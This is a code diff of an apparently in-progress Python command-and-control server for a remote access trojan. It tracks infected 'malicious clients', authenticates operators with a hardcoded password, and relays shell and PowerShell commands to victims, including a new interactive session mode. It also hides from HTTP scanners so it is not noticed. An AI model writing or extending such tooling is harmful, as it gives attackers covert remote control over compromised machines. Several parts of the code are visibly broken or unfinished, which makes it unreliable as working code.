@@ -34,31 +34,33 @@ if not quiet:
     global_debug = True
 else:
     global_debug = False
-
+    
 ##Reference: https://realpython.com/python-logging/
 logging.basicConfig(level=logging.DEBUG)
 ## Change the path to the system path + a log folder/file somewhere
 logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
 if global_debug:
     logging.getLogger().addHandler(logging.StreamHandler())
-
-
-##Global Time Var for consistent time
+    
 
 ################
 ## Initial Handler
 ################ 
+    """
+    This is the first thing that friendly, and malicious clients talk to. 
+    
+    Flow:
+    (this is a loop)
+    |                      / if header is !_client_! -> (new thread) ServerMaliciousClientHandler                  \                            |
+    | Receive connection -> if HTTP request, redirect to website (in this case, youtube)                             | Else: throw logging.warn | Loop
+    | (start_server)       \ if header is !_userlogin_!, login handler -> (new thread) ServerFriendlyClientHandler /                            |
+    
+    """
+
 class ServerSockHandler:
-    """
-    Description: A class that handles the inital connections, and sends them
-    to the other respective classes as needed
-
-    """
-
     def __init__(self):
         logging.debug(f"===== Startup | Reference Time (UTC) {datetime.now(timezone.utc)} =====")
         self.server_password = "1234"
-
         ##Errors relevant to this funtion
         self.Sx01 = "conn_broken_pipe: A pipe was broken"
         self.Sx02 = "Socket Close: The socket was successfully closed"
@@ -66,39 +68,40 @@ class ServerSockHandler:
         self.Sx04 = "Socket Permission Error: You most likely don'y have permissions to open a socket"
         self.Sx05 = "Connection Refused, Reset or aborted: "
         self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"
-
         self.SxXX = "Unkown error: "
-
         ## Other Values
         self.http_redirect = "https://youtube.com"
-    def socket_cleanup(self):
-        #pass
-        try:
-            self.server.close()
-            logging.debug(self.Sx02)
-
-
-        except Exception as e:
-            logging.warning(f"{self.SxXX}:{e}")
+        ##== Clients & lists
+        self.clients = {}
+        self.current_clients = []
+        self.friendly_current_clients = []
+        self.friendly_clients = {}
 
     def start_server(self, ip, port):
         """
         Description: This is the starting point for this class, it listens for connections,
-        and then delegates/sorts them based on the clients response
+        and passes them off to connection_handler()
+                        
+        ip (str): The IP for the server to listen on
+        port (int): The port for the server to listen on
         """
-
-    ##== Initial Connection (these are server values, NOT client values)
+    ##== Initial Connection (these are server connections, NOT client connetions)
+        
+    ##!! dev note, in future iterations maybe add a webserver component, using post & get commands instead of this
+    ## custom protocol stuff - who knows
         try:
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             # this allows the socket to be reelased immediatly on crash/exit
             self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
             self.ADDR = (ip,port)
-            self.server.bind(self.ADDR)  
+            self.server.bind(self.ADDR)
+            ## A cleanup function incase of crash/on exit
             atexit.register(self.socket_cleanup)
+            ## starting listener
             self.server.listen()
+            self.connection_handler()
             logging.debug(f"[Server] Server started, and listening: {self.ADDR}")
-
         ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
         except TimeoutError as e:
             logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
@@ -108,144 +111,161 @@ class ServerSockHandler:
             logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
         except Exception as e:
             logging.warning(f"ERRMSG: {e}\n")
+                
+    def socket_cleanup(self):
+        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
+        & no errors are run into. Left fairly empty for now, may have more use in the future.
+            
+        Called by start_server
+            """
+        try:
+            ## closing the connection
+            self.server.close()
+            logging.debug(self.Sx02)
+        except Exception as e:
+            logging.warning(f"{self.SxXX}:{e}")                
         
-
-    ##== Clients & lists
-        self.clients = {}
-        self.current_clients = []
-        
-        self.friendly_current_clients = []
-        self.friendly_clients = {}
-
-    ##== Connection Loop
+    def connection_handler(self):
+        """The loop that handles the conections, and passes them off to respective threads/classes
+            
+        It's a bit messy
+            
+        """
         while True:
             ##== Initial  handling of client 
             try:
-                #logging.debug(f"Server Listening: {self.ADDR}")
-
                 self.conn, addr = self.server.accept()
 
                 ## Getting client id from the client, and the IP address
                 self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
-                logging.debug(f"[{self.client_remote_ip_port} -> Server] Accepted Connection from: {self.client_remote_ip_port}")
-
-                ## decode THEN split
-                self.response = bytes_decode(self.conn.recv(1024)).split("\\|/")
-                #logging.debug(f"[{self.client_remote_ip_port} -> Server] {self.response}")
-                
-                ##== parsing client response
+                logging.debug(f"[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")
+                        
+            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+                response_list = []
+                logging.warning(f"[Server (connection_handler)] Client {self.client_remote_ip_port} disconnected")                
+            except Exception as e:
+                logging.debug("[Server (connection_handler)] Unkown Error: {e}")                
+            ##== Parsing the message sent to the server
+            
+            try:
+                ## decoding message THEN splitting into a form the server understands.
+                ## raw messages look like: !_client_!\|/AADDB\|/Command
+                self.response = bytes_decode(self.conn.recv(1024)).split("\\|/")        ##<< message handler reciever thingy here needed                    
+                ##== parsing client response, if valid
+                ## this: !_client_!\|/AADDB\|/Command should turn into -> [!_client_!, AADDB, Command]
                 response_list = []
                 for i in self.response:
-                    response_list.append(i)
-
-            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-                response_lisr = []
-                logging.warning(f"Client {self.client_remote_ip_port} disconnected")
-
-            #logging.debug(f"Parsed response from {self.client_remote_ip_port}: {response_list}")
-
-            try:
-                self.client_type = response_list[0]
-                self.id = response_list[1]
-                self.message = response_list[2]
+                    response_list.append(i)                    
+                ##response_list again for reference: [!_client_!, AADDB, Command]
+                self.client_type, self.id, self.message = response_list
                 logging.debug(f"[Server] Client Established: {self.client_remote_ip_port} id={self.id}")
 
-            except:
-                ## Not setting self.id as it's first in the list, and SHOULD alwys have a value
-                ## however an empty request may fool it
+            except Exception as e:
+                self.client_type = "None"
                 self.message = "None"
                 self.id = "None"
-                logging.debug(f"No message, or ID value was recieved. response_list={response_list}")
-
+                logging.debug(f"No message, or ID value was recieved. response_list={response_list}, error={e}")   
+                             
+        ##== The decision handler based on the client_type, which can be:
+            ## !_client_!: A malicious client
+            ## !_userlogin_!: A friendly client trying to log in    
+            
             ## == Decisions based on parsed messages
             if self.client_type == "!_userlogin_!":
                 try:
-                    print(self.message)
-                    username = self.id
-                    password = self.message
-
+                    # Try to extract the username and password from the message
+                    username, password = self.id, self.message                        
                 except ValueError as e:
-                    username = None
-                    password = None
+                    # If there is a value error, set the username and password to None
                     logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
-                    
+                    username, password = None, None                        
                 except Exception as e:
-                    username = None
-                    password = None
-                    logging.debug(f"Unkown error with logon process: {e}")
-                
-                friendly_client_name = f"!!~{username}"
+                    # If there is any other exception, set the username and password to None
+                    logging.debug(f"Unknown error with logon process: {e}")
+                    username, password = None, None
 
+                ## all friendly clients are refered to with !!~ infront of their name (has to do with identifying them in the gloabls function)
+                friendly_client_name = f"!!~{username}"                    
+                ## Running the authentication check, and starting the friendly client thread if successful
                 if self.password_eval(password):
                     try:
-                    ##== sending the a-ok on successful authentication
+                        ##== sending the a-ok on successful authentication
                         self.conn.send(str_encode("0"))
 
-                        logging.debug(f"[Server (Logon)]Successful Logon from: {friendly_client_name}")
+                        logging.debug(f"[Server (Logon)] Successful Logon from: {friendly_client_name}")
 
-                        if friendly_client_name not in self.friendly_current_clients:
-                            self.friendly_current_clients.append(friendly_client_name)
-
-                        ## Addinng the class instance with the value of friendly_client_name
-                        ## to the globals so it can be called upon by name, and adding in the connection + addr
+                        # Add friendly client to current clients list
+                        self.friendly_current_clients.append(friendly_client_name)
+                            
+                        ## This adds the class instance to the globals list, with the name being friendly_client_name. This allows
+                        ## it to be accessed in other parts of the code, and is the backbone of how all this works. 
+                        ## additionally, this is where the connection is passed off to the ServerFriendlyClientHandler class
                         self.friendly_clients[friendly_client_name] = ServerFriendlyClientHandler(self.conn, self.ADDR)
-                        globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]              
+                        globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]
 
-                    ## == Thread handler
-                        friendly_thread = threading.Thread(
+                        ## == Thread handler
+                        # Create thread for the friendly client's communication
+                        threading.Thread(
                             target=self.friendly_clients[friendly_client_name].friendly_client_communication,
                             args=(self.response, username)
-                        )
-                        friendly_thread.start()
-                        #logging.debug(f"Thread for object {friendly_client_name} created")
+                            ).start()
 
                     except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                         logging.warning(f"Friendly Client {friendly_client_name} disconnected")
                     except Exception as e:
-                        logging.warning(f"{self.Sx-1}:{e}")
+                        logging.warning(f"{self.Sx-1}:{e}")                            
+                ## On failed authentication, sending back a 1 & log
                 else:
                     self.conn.send(str_encode("1"))
-                    logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")
-
-##====================================== Construction ===========
+                    logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")                
+            
+            ## !_client_! handler
             elif self.client_type == "!_client_!":
-                #logging.debug(f"Message from Infected Client {self.id} recieved")
-
-                ## peername[0] is ip, [1] is port
-                ## Might want to rethink this as it may reach out to cleint again.
-                ## or jsut create a self.ip and self.port
+                # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
                 client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id
 
+                # If client is not in current clients list, add it
                 if client_name not in self.current_clients:
                     self.current_clients.append(client_name)
-                    ## creating object intance
-                    self.client = ServerMaliciousClientHandler()
-                    # adding the instance self.client to the self.clients dict
-                    self.clients[client_name] = self.client
-                    globals()[client_name] = self.client
-                
-                ## creating thread for this communication
-                thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
-                thread.start() 
-##====================================== Construction ^^^^ ===========
-               
 
+                    # Create a new malicious client handler instance and add it to the clients dict
+                    self.clients[client_name] = ServerMaliciousClientHandler()
+                    globals()[client_name] = self.clients[client_name]
+
+                # Create a new thread for this client's communication
+                threading.Thread(
+                    target=self.clients[client_name].handle_client,
+                    args=(self.conn, self.ADDR, self.response, self.id)
+                    ).start()                    
+            ## The webserver fake-out
+                """
+                I'm split. There's 2 approaches I could take here, 
+                    1) make this a full blown webserver
+                    2) make it so locked down that you need a valid messag to connect.                        
+                    1 is definently cooler, but 2 is what I had set up before, and seems to be the best option 
+                    for not getting noticed. Plus the server is "down" unless hit correctly. And the custom protocol stuff 
+                    is pretty cool too
+                """                
             elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                 ## I should capture these too and see whos hitting it
-                #self.conn.send(str_encode("<p1>403 Forbidden</p1>"))
-                ## Sneaky redirect to youtube 
-                self.conn.send(str_encode(f'<meta http-equiv = "refresh" content = "0; url = {self.http_redirect}" />test</meta>'))
-                logging.debug("Recieved HTTP Request... redirecting to webpage")
+                ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
+                self.conn.close()
+                logging.debug("Recieved HTTP Request... closing connection")
+                
             else:
                 logging.critical(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {response_list} ")
-
+                self.conn.close()
+    
+    """
+        The password eval function. returns true if successful
+    """
     def password_eval(self, password=None) -> bool:
         ## decrypt pass
 
         _password = str(password)
 
         if _password == None:
-            logging.debug("Password with value of 'None' passed to the password eval function")
+            logging.debug("[Server (password_eval)] Password with value of 'None' passed to the password eval function")
         
         ## the else covers my ass for any potential injection/rifraff with the None parameter
         else:
@@ -254,14 +274,27 @@ class ServerSockHandler:
             else:
                 return False
 
+
 ################
 ## Friendly client
 ################ 
-class ServerFriendlyClientHandler:
     """
-    Desc:  This class is called on a per friendly client basis, and handles/stores all the data needed
+    Desc:  This class is called on a per friendly client basis, and handles all the data needed
     for each respective client.
-    """
+    
+    
+    Flow: (in a loop)
+                                        if header is !_servercommand_!, server_decision_tree -> action on server -> sends back to friendly client
+                                        /
+    friendly_client_communication, recv msg     
+                                        \
+                                         if header is !_clientcommand_! client_decision_tree -> command sent to client -> client action, sends back to server -> server sends to friendly client
+    """                 
+
+
+
+class ServerFriendlyClientHandler:
+
     def __init__(self, conn, addr):
         ## Init variables so error messages don't error out if called b4 they are assigned :)
         self.conn = conn
@@ -292,32 +325,29 @@ class ServerFriendlyClientHandler:
         while message:
             raw_user_input = bytes_decode(self.conn.recv(1024))
             user_input = self.parse_msg_for_server(raw_user_input)         
-            #print(f"HERE {raw_user_input}")
+
             logging.debug(f"[client ({self.username}) -> Server] {raw_user_input}")
             try:
                 #print(user_input)
                 user_header = user_input[0]
                 user_username = user_input[1]
-                user_command= user_input[2]
+                user_command = user_input[2]
 
                 if user_header == "!_servercommand_!":
                     #logging.debug("[!_servercommand_!]")
                     self.server_decision_tree(user_command)
                 
                 ## format that fclient needs to send(see client_decision_tree)
-                ## !_servercommand_!\|/ryan\|/action value CLIENTNAME
+                ## !_servercommand_!\|/bob\|/action value CLIENTNAME
                 ##client name is always last for future compatability
                 elif user_header == "!_clientcommand_!":
                     #logging.debug("[!_clientcommand_!]")
                     self.client_decision_tree(user_command)
                 
-
             except Exception as e:
-                err_str = f"[Server (ServerFriendlyClientHandler)] Error with username or command, input={raw_user_input}: {e}"
+                err_str = f"[Server (ServerFriendlyClientHandler) - confusing error message, catches every error from the decsision trees -] Error with username or command, input={raw_user_input}: {e}"
                 logging.debug(err_str)
-                self.send_msg(err_str)
-                #break
-            #message = None
+                self.send_msg_to_friendlyclient(err_str)
 
 ################
 ## Server Decision tree
@@ -348,11 +378,9 @@ class ServerFriendlyClientHandler:
         except:
             if message == "clients":
                 if self.current_client_list != "":
-                    self.send_msg(self.current_client_list)
-                    ##== these can generate a lot of  messages very quickly, leaving disabled for now
-                    #logging.debug(f"[] Current Clients: {self.current_client_list}")
+                    self.send_msg_to_friendlyclient(self.current_client_list)
                 else:
-                    self.send_msg("No Current Clients")
+                    self.send_msg_to_friendlyclient("No Current Clients")
             
             ################
             ## Export Commands
@@ -363,14 +391,12 @@ class ServerFriendlyClientHandler:
                 try:
                     with open("server_json.json", "r+") as json_file:
                         data = json.load(json_file)
-                        self.send_msg(str(data))
+                        self.send_msg_to_friendlyclient(str(data))
                         logging.debug("[Server (export-clients)]: Success")
                 except Exception as e:
                     logging.debug(f"[Server (export-clients)] Error with exporting client data: {e}")
-                    self.send_msg(f"[Server (export-clients)] Error with exporting client data: {e}")
+                    self.send_msg_to_friendlyclient(f"[Server (export-clients)] Error with exporting client data: {e}")
 
-            ## for all clients, 
-            ## a  for loop might work well here
             elif message == "stats":
                 pass
                 """
@@ -378,14 +404,11 @@ class ServerFriendlyClientHandler:
                     client = globals()[i]
                     return_stats_list.append(client.data_list)
                 """
-                #data_list
-                ## Need: client instance name
-                ## then call: client_instance.stats
             elif message == "":
-                self.send_msg("Client sent nothing")
+                self.send_msg_to_friendlyclient("Client sent nothing")
             
             else:
-                self.send_msg("Command not found")
+                self.send_msg_to_friendlyclient("Command not found")
                 #elf.client_decision_tree(message)
 
     def current_client_refresh(self) -> None:
@@ -422,6 +445,24 @@ class ServerFriendlyClientHandler:
         validated: command is in a working state accross all 3 pieces (RAT, Server, Client)
         
         [Windows only]/[Linux only]: commands that only work on windows/limux
+        
+        
+    #### =================== INGORE THE ABOVE SHIT ========================
+    
+    NEW DOCUMENTATION:
+    
+    if the command is not meant for the server, (aka is not session), it filters down here.
+    The session command exists down here, and it's job is to provide an interactive session with the client. 
+    
+    The way cobalt does it is you send a command, and every checkin you get a result. 
+    The way I'm doing it is different. The client still checks in every X time, (and you can set jobs - need to figure that out)
+    but you can also spawn an instant session on the client with the session command. Basically, at the next checkin, a session will be spawned
+    with the selected client
+    
+    command works like this: session 0 client name
+        !! ignore the 0, but still include it, it's a placeholder for nothing
+    
+    
 
     """
     def client_decision_tree(self, raw_message):
@@ -445,65 +486,68 @@ class ServerFriendlyClientHandler:
         else:
             logging.debug(f"[Server] Client {self.client} not found")
 
-        ################
-        ## User Interaction commands,
-        ## These reutrn readable data
-        ################ 
-        # == Static, From Server, not validated
-        if client_command == "get-data":
-            if client_command_value == "stats":
-                data = f"{self.client.data_list}"
-                self.send_msg(data)  
-            elif client_command_value == "connection":
-                data = f"{self.client.conn}\n{self.client.ip}:{self.client.port}"
-                self.send_msg(data)  
-            elif client_command_value == "":
-                self.send_msg("Please enter a data type, options are \nstats, connection")
-            else:
-                self.send_msg("Not a valid data type")
-
-        # == Dynamic, To Client, not validated [missing RAT side]
-        elif client_command == "set-heartbeat":
-            heartbeat_value = client_command_value
-            logging.debug(f"[Server: Username] Setting Heartbeat of {heartbeat_value} for {self.client}")
+        if client_command == "session":
+            self.client.under_control = True
+            self.send_msg_to_friendlyclient(f"Session on {self.client.fullname} opened")
             
-            self.client.interact("set-heartbeat", heartbeat_value)
-            ## sanity check
-            if self.client.current_job == f"set-heartbeat\\|/{heartbeat_value}":
-                ## == Message back to client
-                self.send_msg(f"Heartbeat queued to be set to: {heartbeat_value}")
-                logging.debug(f"Heartbeat queued to be set to: {heartbeat_value}")   
-
-            else:
-                self.send_msg(f"Error setting heartbeat for {self.client}")
-                logging.debug(f"Error setting heartbeat for {self.client}")   
+            ## telling client to go into a listening loop, client sends back an okay, otherwise this hangs
+            ## as it's waiting for a response
+            self.client.send_msg("session\\|/session")
+            
+            while True: #self.client.under_control:
+                #logging.debug(f"[Server (session with {self.client.fullname})]")
+                try:
+                    ## Need to re-do client to shut up & listen (aka not reconnect) when not getting the "wait" command
+                    
+                    print("SESSION LOOP")
+                    ## listen for friendly client
+                    a = bytes_decode(self.conn.recv(1024))
+                    #print(a)
+                    
+                    #
+                    session_command, session_command_value = a.split()
+                    
+                    print(f"A value: {a}")
+                    
+                    if client_command == "break":
+                        print("break")
+                        #pass
+                        #self.client.under_control = False
+                    
+                    else:
+                        print("else")
+                        results = self.client.send_msg(f"{session_command}\\|/{session_command_value}")
+                        self.send_msg_to_friendlyclient(results)
+                    
+                    print("loop")
+                except Exception as e:
+                    print(e)
+                
         
-        # == Dynamic, To Client, not validated [missing RAT side]
-        ## cmd on win, bash on lin
-        elif client_command == "run-command":
-            ## Sending back results of command run
-            self.send_msg(self.client.interact("run-command", client_command_value))
+        ## if commandfromgui = session
+            ## self.client.under_control = True (tells client to not do checkins)
+            ## results = self.client.send(command)
+            ## self.send_msg_to_Friendlyclient(results)
         
-        # [Windows only] # == Dynamic, To Client, not validated [missing RAT side]
-        elif client_command == "run-command-ps":
-            self.send_msg(self.client.interact("run-command-ps", client_command_value))
-
-
-        ## stats on a per client basis
-        elif client_command == "stats":
-            pass
+        ## at end:
+            #self.client.under_control = False (everything back to normal)
         
-        else:
-            self.send_msg(f"Invalid job/command: {client_command}")
-            logging.debug(f"Invalid job/command: {client_command}")
+        
+        #elif client something else:
+            #set job for next checkin (shouldn't be too hard theoretically)
+       
+        
+        
 
-    def send_msg(self, message:str):
+################
+## MSG to Friendly Client stuff
+################ 
+
+    def send_msg_to_friendlyclient(self, message:str):
         try:
             HEADERSIZE = 10
             message = f"{len(message):<{HEADERSIZE}}" + message
-            #print(message)
             #print("---head--|msg->")
-            #print(f"Message being sent back to fclient: {message}")
             encoded_response = str_encode(message)
             self.conn.send(encoded_response)
 
@@ -514,9 +558,7 @@ class ServerFriendlyClientHandler:
 
     ##== Dev Note!! These need to always return SOMETHING in their lists, 
     ## that way it's  played safely and doesnt error  out
-    def parse_msg_for_server(self, raw_message) -> list:
-        #print(f"Raw Message: {raw_message}")  if global_debug else None
-        
+    def parse_msg_for_server(self, raw_message) -> list:        
         ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
         try:
             parsed_results_list = raw_message.split("\\|/")
@@ -526,20 +568,35 @@ class ServerFriendlyClientHandler:
         return parsed_results_list
     
     def parse_msg_for_client(self, raw_message) -> list:
-        #print(f"Raw Message: {raw_message}")  if global_debug else None
-        
         ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
         try:
             parsed_results_list = raw_message.split()
         except:
             parsed_results_list = ["EMPTY","EMPTY","EMPTY"]
         
-        #print(f"Parsed Message: {parsed_results_list}") if global_debug else None
         return parsed_results_list
+
 
 ################
 ## Malicious Client Handler
 ################ 
+"""
+    Desc:  This class is called on a per malcious client basis, and handles the commands being sent to said malicious clients. Multiple instances of this
+    class are created, one for each client that checks in. Those instances are interacted with through the ServerFriendlyClientHanlder instances. 
+    
+    Flow (extends the ServerFriendlyclientHandler flow)
+    
+    <IGNORE THIS>
+    if header is !_clientcommand_! client_decision_tree -> calls client class instance -> client class instance handles command, formats if necesary (self.current_job), and sends to client when it checsk in->
+     (continued) client class instance recieves response, and RETURNS the response back to the ServerFriendlyclientHandler instance, which sends that data to the requesting friendly client
+    </IGNORE THIS>
+    
+    Update: This class does nothing actively, and only gets called on when its created, and when a message needs to be sent to a client via the send_msg. It's a work
+    in progress
+    
+    Additionally, and this is newer, it updates JSON keys for the malicious client, with info on said malicious client for GUI stuff (i.e. client viewer)
+"""
+
 
 ## perclient & interact left
 class ServerMaliciousClientHandler:
@@ -571,6 +628,7 @@ class ServerMaliciousClientHandler:
         self.id = id
         ## ugly yes, but it works for now. 
         self.fullname = "client_" + self.ip.replace(".","_") + f"_{self.id}"
+        self.under_control = False
         
         self.data_list = [
             self.stats_heartbeats,
@@ -596,115 +654,114 @@ class ServerMaliciousClientHandler:
         ## Runs every checkin, howeer the method will not write data if a record of this client exists
         Data.json_new_client(json.dumps(new_client))
         
-        
-        
-        while message:
-            self.decision_tree(message)
-
+        '''while message:
+            self.interact()
+            
             if not message: 
                 break
             message = None
         
         ## Closing connection so a session doesn't stay established with the client
-        conn.close()
-
-    def decision_tree(self, received_msg):
-        ## might be better to put the full client name/ip+id instead of just ID
-        logging.debug(f"[{self.id} -> Server] MSG from Client: {received_msg}")
-
-        if received_msg[1] == self.id:
-            self.stats_heartbeats = self.stats_heartbeats + 1
-            self.stats_latestcheckin = str(datetime.now(timezone.utc))
-            logging.debug(f"[{self.id} -> Server] Heartbeat")
-            logging.debug(f"[Server ({self.id})] Current Job: {self.current_job}")
-
-            ## can do if msg == whatever AND this to cleanup
-            if self.current_job != None:
-                logging.debug(f"[Server -> {self.id}] sending {self.current_job} to {self.id}")
-                ## sending job
-                self.send_msg(self.current_job) 
-
-                if self.current_job != "wait":
-                    ## stats
-                    self.stats_jobsrun = self.stats_jobsrun + 1  
-                self.cleanup()
-            else:
-                self.current_job = "wait\\|/wait"
-                self.send_msg(self.current_job)
-        else:
-            try:
-                logging.critical(f"{self.Sx12} {self.id}, {self.ip}:{self.port}")
-            except: 
-                logging.critical(f"{self.Sx12} Info Not Available - check for any weird clients")
-
-    def interact(self, user_input_raw, command_value=None):
+        conn.close()'''
+        #self.interact()
+        
         """
-        This may be confusing
+        ##basically, if being controlled, don't send anything, but once it's not being controlled, continue and send wait until next checkin
+        #if self.under_control = True
+        while self.under_control
+            pass
+            
+        #else:
+            #send wait
+        
+        send_msg("wait")
+        
+        """
+        
+                
+        ##fclient calls interact, passes user_input & command value
+        
+        ## if job not wait, interact sends keepalive, which (client side) loops the communication. 
+        
+        ## On loop, client listens for recv, runs command, and sends back. Loops again and so on
+        
+        ## on wait, client exits that loop, and checks in every X sleep time
+        
+        ##=============
+        """
+            Connection is passed here after established. when established, need to determine whether to tell it to sleep, or continue interacting. Additionally, we
+            need to figure out how to trigger an interact from the gui. 
+            
+            maybe: if job = interact, interact loop. Fclient would have to tell interact that the current job is interact, and on the next checkin, the server
+            will tell the client to interact
+            
+        
+        
+        """
+        
+    '''def fclient_interact(self, user_input_raw, command_value):
+        self.current_job = "stuff"
+        
+        return "results"
 
-        This function is used for taking the friendly client input (input comes from 
-        theServerSockHandler filter), and setting jobs for malicious clients. 
-
-        diagram:
-        GUI -> This function, sets self.current_job. 
-        Then, client checks in, reads self.current_job, and runs it through its filters
+    def interact(self, user_input_raw="heartbeat", command_value=None):
+        """
+            If a command has to need a specail formatting, it gets it's own "if", otherwise
+            commands are fired blindly at the client. Yes this could be a problem in the future, but it's alot easier than
+            adding every freaking command possibel here
+            
+            Note, just keep it in the back of your head to test cmd injection here
+            
+            In a nutshell, this is how this works.
+            
+            On connection, 'interact' is called. if user_input_raw isn't supplied (aka it's just checking in, and no job has been supplied to it), 
+            it defaults to heartbeat. This results in a job of wait. 
+            
+            If user_input_raw does contain something, then that command is sent over to the malicious client on next check in.
+            
+            The client sends back it's response, and that response is returned to the calling function, which if from a friendly client, gets sent back to the friendly client.
+            
         """
         user_input = user_input_raw.lower()
 
-        ##  leaving jobs & descriptions out as that is handled on the logec side
-
-        if user_input == "run-command":
-            self.current_job = f"run-command\\|/{command_value}"
-            return f"standin-command-results, command run: {command_value}"
-
-        elif user_input == "wait":
+        ## checkin
+        if self.current_job == "":
             self.current_job = "wait\\|/wait"
-
-        elif user_input == "set-heartbeat":
-            #new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")
-            new_heartbeat = command_value
-            self.current_job = f"set-heartbeat\\|/{int(new_heartbeat)}"
-
-        elif user_input == "kill":
-            ## add additional actions like shutdown, or crash PC in the command slot
-            self.current_job = f"kill\\|/kill" 
-
-        elif user_input == "current_job":
-            pass
-            ##need to  send backcurrent job
-            #print(self.current_job.strip("\\|/"))
-            self.send_msg(self.current_job.strip("\\|/"))
-
-        elif user_input == "run-command-ps":
-            ps_command = command_value
-            self.current_job = f"run-command-ps\\|/{ps_command}"
-
-        elif user_input == "":
-            pass
-            #send bacck instead of print
-            #print("No input provided!")
-            self.send_msg("No input provided")
-
-        else:
-            logging.debug(f"[Server (Gui -> server, setting job)] error with job setting")
-            #send back as well
-            #print("Job does not exist - type 'jobs' for jobs")
-            self.current_job == "none"
-            self.send_msg("Invalid job, type 'jobs' for jobs")
+            self.send_msg(self.current_job)
         
+        else:
+            self.send_msg("keepalive\\|/keepalive")
+            ## receives ok on keepalive msg
+            while True:
+                if self.current_job != "break":
+                    self.current_response = self.send_msg(self.current_job)
+                else:
+                    break
+                
+            self.send_msg("deadbeef\\|/deadbeef")'''
+    
     def cleanup(self):
         self.current_job = "wait\\|/wait"
     
     def send_msg(self, message):
-        #print(f"Message being sent to cleint: {message}") #if global_debug else None
-        ##Test >1024
+        ##Message goes TO malicious client, and this listens for a response
         try:
             self.conn.send(str_encode(message))
+            print("waiting on server to talk back")
+            
+            response = bytes_decode(self.conn.recv(1024))
+            print(f"response: {response}")
+            
+            return response
 
         except Exception as e:
             logging.debug(f"[Server ({self.id})] Error: {e}")
+            
+
 ################
 ## QOL Functions
 ################
+
 """
 Desc: A custom encode/decoder for things, with a format try/except block built in.
 Some clients send odd characters sometimes so this is a failsafe
@@ -715,7 +772,6 @@ def str_encode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) 
     for format in formats:
         try:
             return input.encode(format)
-            logging.debug(f"Succesfully encoded bytes to {format}")
         except UnicodeEncodeError:
             logging.debug(f"Could not encode bytes to {format}")
         except Exception as e:
@@ -732,6 +788,7 @@ def bytes_decode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]
             logging.debug(f"Could not decode bytes to {format}")
         except Exception as e:
             logging.warning(f"ERRMSG: {e}\n")
+
 
 ################
 ## JSON & Data
@@ -838,22 +895,12 @@ class Data:
                 break
         ## old way
         #data[parent_key][0][keyname] = value
-        
-        #print(data)
-        
         ## write file after modification
         with open("server_json.json", "w") as json_file:
             json.dump(data, json_file)
-        
-        
 
-## example new client
-#Data.json_new_client('testclient')
-## examle key update
-#Data.json_update(keyname="ClientFullName", value="1234", parent_key="MaliciousClients", client_name="Placeholder")
 
-##creating JSON file
+#if __name__ == "__main__":
 Data.json_create()
 s = ServerSockHandler()
 s.start_server(ip, port)
-logging.debug("[Server] Server Started")
